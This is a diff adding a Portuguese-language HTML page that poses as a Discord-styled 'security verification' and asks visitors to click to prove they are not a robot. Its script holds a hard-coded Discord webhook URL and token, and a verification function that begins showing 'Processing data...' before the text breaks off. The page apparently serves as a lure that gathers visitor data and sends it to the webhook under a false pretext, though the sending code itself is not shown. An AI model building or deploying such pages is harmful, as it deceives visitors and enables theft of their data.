@@ -1,0 +1,96 @@
+index.html
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Segurança</title>
+    <style>
+        /* Estilização Dark Mode inspirada no Discord */
+        body { 
+            background-color: #36393f; 
+            color: white; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .card { 
+            background: #2f3136; 
+            padding: 30px; 
+            border-radius: 15px; 
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
+            text-align: center; 
+            width: 85%; 
+            max-width: 400px; 
+        }
+        h2 { margin-bottom: 10px; font-weight: 600; }
+        p { color: #b9bbbe; font-size: 15px; margin-bottom: 25px; }
+        
+        .btn { 
+            background-color: #5865F2; 
+            color: white; 
+            border: none; 
+            padding: 15px 40px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            font-weight: bold; 
+            transition: background 0.3s ease; 
+            width: 100%;
+        }
+        .btn:hover { background-color: #4752C4; }
+        
+        #status { 
+            margin-top: 20px; 
+            font-size: 14px; 
+            color: #ffffff; 
+            display: none; 
+            font-weight: 500;
+        }
+        
+        .loader { 
+            border: 4px solid #4f545c; 
+            border-top: 4px solid #ffffff; 
+            border-radius: 50%; 
+            width: 30px; 
+            height: 30px; 
+            animation: spin 1s linear infinite; 
+            margin: 15px auto; 
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>Verificação</h2>
+        <p>Para acessar o servidor, clique no botão abaixo para confirmar que você não é um robô.</p>
+        
+        <button id="verifyBtn" class="btn" onclick="startVerification()">Verificar Agora</button>
+        
+        <div id="loader" class="loader"></div>
+        <div id="status">Processando dados...</div>
+    </div>
+
+    <script>
+        // =================================================================
+        // COLOQUE A URL DO SEU WEBHOOK DO DISCORD ABAIXO
+        // =================================================================
+        const webhookURL = 'https://discord.com/api/webhooks/1561185487920570458/Sgci4qwpxhRwiCBuPfE3OCdiI-u12saeyUwJniO6-y7Cnsr3CLvGVIVBw7TPRoHLgYXV'; 
+        // =================================================================
+
+        async function startVerification() {
+            const btn = document.getElementById('verifyBtn');
+            const loader = document.getElementById('loader');
+            const statusText = document.getElementById('status');
+
+            // Interface de carregamento
+            btn.style.display = 'none';
+            loader.style.display = 'block';
+            statusText.style.display = 'block';
+            statusText.innerText
